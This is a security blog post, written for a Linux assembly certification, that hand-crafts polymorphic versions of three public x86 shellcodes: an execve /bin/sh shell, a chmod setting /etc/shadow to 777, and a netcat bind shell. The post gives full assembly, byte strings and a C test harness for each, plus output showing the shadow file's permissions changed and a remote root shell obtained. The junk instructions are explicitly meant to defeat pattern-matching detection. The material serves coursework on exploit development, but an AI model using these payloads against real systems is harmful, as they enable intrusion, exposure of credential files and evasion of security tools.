---
layout: post
title: Polymorphic Shellcode
date: 2021-01-17 20:30:00
categories: posts
comments: false
en: true
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. 

According to wikipedia, "Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each 
time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and 
operations.". This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.

Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands! 

The sixth assignment from the seven requires taking three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) from [shell-storm.org](http://shell-storm.org/) and generate 
polymorphic versions of such. In addition, its size should not be bigger than 50%.

#### Execve Shellcode (Shellcode #1)

The first shellcode from the three will be one that executes ```/bin/sh``` through the ```execve``` syscall. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-827.php). 

###### Original code

```term
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
mov    al,0xb
int    0x80
```

There are infinite ways to modify such shellcode. For instance, "NOP equivalents" could be used, which add no functionality whatsoever and difficult pattern matching. 
Furthermore, the value ```/bin/sh``` that is pushed within the instructions ```push   0x68732f2f``` and ```push   0x6e69622f``` could be reduced by 1 and then incremented while 
being saved on a specific registers instead of directly the stack.

###### Final code:

```term
global _start

_start:

       sahf                      ; Should store instructions. However, it is used as a NOP equivalent.

       xor    eax,eax            ; Zeroes out EAX.
       pushad                    ; Should save the current flags. However, it is used as a NOP equivalent.
       push   eax                ; Pushes the dword of EAX (0x00000000).

       cld                       ; Should clear the direction flag. However, it is used as a NOP equivalent.
       mov esi, 0x68732f2e       ; Saves value "hs/.". If incremented by 1, it should possess value "hs//".
       inc esi                   ; Increments ESI.
       cdq                       ; Zeroes out EDX. Also a NOP Equivalent.
       mov edi, 0x6e69622e       ; Saves value "nib.". If incremented by 1, it should possess value "bin/".
       inc edi                   ; Increments EDI.

       push esi                  ; Pushes the value of ESI ("hs//").
       std                       ; NOP Equivalent.
       push edi                  ; Pushes the value of EDI ("bin/").

       mov ebx, esp              ; Saves the value of ESP in EBX.
       cld                       ; NOP Equivalent.
       cmc                       ; NOP Equivalent.

       mov al, 11                ; Calls execve.
       int 0x80                  ; Calls to kernel.
```

Let's dump the shellcode and test it!

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 
's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x9e\x31\xc0\x60\x50\xfc\xbe\x2e\x2f\x73\x68\x46\x99\xbf\x2e\x62\x69\x6e\x47\x56\xfd\x57\x89\xe3\xfc\xf5\xb0\x0b\xcd\x80"
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode#
```

```term
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x9e\x31\xc0\x60\x50\xfc\xbe\x2e\x2f\x73\x68\x46\x99\xbf\x2e\x62\x69\x6e\x47\x56\xfd\x57\x89\xe3\xfc\xf5\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame #1

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# ./polymorphic 
Shellcode Length:  30
#
```

Original Size: 23 bytes
Final Size: 30 bytes

Increment: 31%

#### Chmod Shellcode (Shellcode #2)

The second shellcode from the three will be one that performs a ```chmod``` operation on the file ```/etc/shadow``` with privileges ```777```. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-590.php). 

###### Original code:

```term
xor    eax,eax
push   eax
mov    al,0xf
push   0x776f6461
push   0x68732f63
push   0x74652f2f
mov    ebx,esp
xor    ecx,ecx
mov    cx,0x1ff
int    0x80
inc    eax
int    0x80
```

There aren't many things that we can do. Nonetheless, we can apply similar techniques as we did on the previous shellcode.

###### Final code:

```term
; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-590.php

global _start

_start:

       dec ebp            ; NOP Equivalent.

       xor eax, eax       ; Zeroes out EAX.
       cdq                ; Zeroes out EDX.
       push edx           ; Pushes the dword of EDX (0x00000000).
       mov al, 0xf        ; Moves value of syscall chmod into AL.

       sahf               ; NOP Equivalent.
       push 0x776f6461    ; woda

       cld                ; NOP Equivalent.
       push 0x68732f63    ; hs/c

       push 0x74652f2f    ; te//
       cdq                ; NOP Equivalent.

       mov ebx, esp       ; Copies value from ESP to EBX.
       pushfd             ; NOP Equivalent.
       mov cx, 0x1ff      ; Value that means in octal "0777".
       cmc                ; NOP Equivalent.
       int  0x80          ; Call to kernel.

       inc eax            ; Increment EAX to 1, value for syscall exit().
       pushad             ; NOP Equivalent.
       int 0x80           ; Call to kernel.
```

Let's dump the shellcode and test it!

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 
's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x4d\x31\xc0\x99\x52\xb0\x0f\x9e\x68\x61\x64\x6f\x77\xfc\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x99\x89\xe3\x9c\x66\xb9\xff\x01\xf5\xcd\x80\x40\x60\xcd\x80"
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode#
```

```term
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x4d\x31\xc0\x99\x52\xb0\x0f\x9e\x68\x61\x64\x6f\x77\xfc\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x99\x89\xe3\x9c\x66\xb9\xff\x01\xf5\xcd\x80\x40\x60\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame #2

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ls -la /etc/shadow
-rw-r--r-- 1 511 12079 1115 Dec 28 10:33 /etc/shadow
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ./polymorphic 
Shellcode Length:  39
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ls -la /etc/shadow 
-rwxrwxrwx 1 511 12079 1115 Dec 28 10:33 /etc/shadow
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# 
```

Original Size: 33 bytes
Final Size: 39 bytes

Increment: 19%

#### Netcat Shellcode (Shellcode #3)

Finally, the third shellcode from the three will be one that performs a bind shell connection in port 13377 through the netcat application. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-804.php). 


###### Original code:

```term
section .text
    global _start
_start:
xor eax,eax
xor edx,edx
push 0x37373333
push 0x3170762d
mov edx, esp
push eax
push 0x68732f6e
push 0x69622f65
push 0x76766c2d
mov ecx,esp
push eax
push 0x636e2f2f
push 0x2f2f2f2f
push 0x6e69622f
mov ebx, esp
push eax
push edx
push ecx
push ebx
xor edx,edx
mov  ecx,esp
mov al,11
int 0x80
```

Similarly to the techniques implemented within the previous shellcode, we will insert NOP equivalents which will difficult pattern matching. Nevertheless, these won't change 
execution at all!

###### Final code:

```term
; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-804.php

global _start

_start:

       sahf                    ; NOP Equivalent.
       nop                     ; NOP Equivalent.
       cmc                     ; NOP Equivalent.

       xor eax,eax             ; Zeroes out EAX.
       mul edx                 ; Zeroes out EDX through mul. NOP Equivalent.
       push eax                ; NOP Equivalent.
       pop edx                 ; NOP Equivalent.
       push edx                ; NOP Equivalent.
       pop eax                 ; NOP Equivalent.

       push 0x37373333         ; 7733
       std                     ; NOP Equivalent.
       push 0x3170762d         ; 1pv-
       mov edx, esp            ; Copies the value of ESP into EDX.
       push eax                ; Pushes EAX null dword (0x00000000)
       push 0x68732f6e         ; hs/n
       std                     ; NOP Equivalent.
       push 0x69622f65         ; ib/e
       sahf                    ; NOP Equivalent.
       push 0x76766c2d         ; vvl-
       mov ecx,esp             ; Copies the value of ESP into ECX

       push eax                ; NOP Equivalent.
       push 0x636e2f2f         ; cn//
       cmc                     ; NOP Equivalent.
       push 0x2f2f2f2f         ; ////
       inc edi                 ; NOP Equivalent.
       inc esi                 ; NOP Equivalent.

       push 0x6e69622f         ; nib/
       mov ebx, esp            ; Copies the value of ESP into EBX.
       push eax                ; Pushes EAX null dword (0x00000000)
       cld                     ; NOP Equivalent.
       push edx                ; Pushes value of EDX
       push ecx                ; Pushes value of ECX
       nop                     ; NOP Equivalent.
       push ebx                ; Pushes value of EBX
       cdq                     ; NOP Equivalent.
       mov  ecx,esp            ; Copies value from ESP to ECX
       push esi                ; NOP Equivalent.
       pop edi                 ; NOP Equivalent.
       push edi                ; NOP Equivalent.
       pop esi                 ; NOP Equivalent.
       pop ebp                 ; NOP Equivalent.
       mov al,11               ; Call to execve().
       int 0x80                ; Call to kernel.
```

Let's dump the shellcode and test it!

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 
's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x9e\x90\xf5\x31\xc0\xf7\xe2\x50\x5a\x52\x58\x68\x33\x33\x37\x37\xfd\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\xfd\x68\x65\x2f\x62\x69\x9e\x68\x2d\x6c\x76\x76\x89\xe1
\x50\x68\x2f\x2f\x6e\x63\xf5\x68\x2f\x2f\x2f\x2f\x47\x46\x68\x2f\x62\x69\x6e\x89\xe3\x50\xfc\x52\x51\x90\x53\x99\x89\xe1\x56\x5f\x57\x5e\x5d\xb0\x0b\xcd\x80"
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode#
```

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# cat polymorphic.c 
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x9e\x90\xf5\x31\xc0\xf7\xe2\x50\x5a\x52\x58\x68\x33\x33\x37\x37\xfd\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\xfd\x68\x65\x2f\x62\x69\x9e\x68\x2d\x6c\x76\x76\x89\xe1
\x50\x68\x2f\x2f\x6e\x63\xf5\x68\x2f\x2f\x2f\x2f\x47\x46\x68\x2f\x62\x69\x6e\x89\xe3\x50\xfc\x52\x51\x90\x53\x99\x89\xe1\x56\x5f\x57\x5e\x5d\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame #3

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# ./polymorphic 
Shellcode Length:  83
listening on [any] 13377 ...
192.168.100.139: inverse host lookup failed: Unknown host
connect to [192.168.100.200] from (UNKNOWN) [192.168.100.139] 54156

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@whitecr0wz:~# rlwrap nc 192.168.100.200 13377 -v 
192.168.100.200: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.100.200] 13377 (?) open
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# id 
id 
uid=0(root) gid=0(root) groups=0(root)
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode#
```

Original Size: 62 bytes
Final Size: 83 bytes

Increment: 34%

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/Assignment_6).
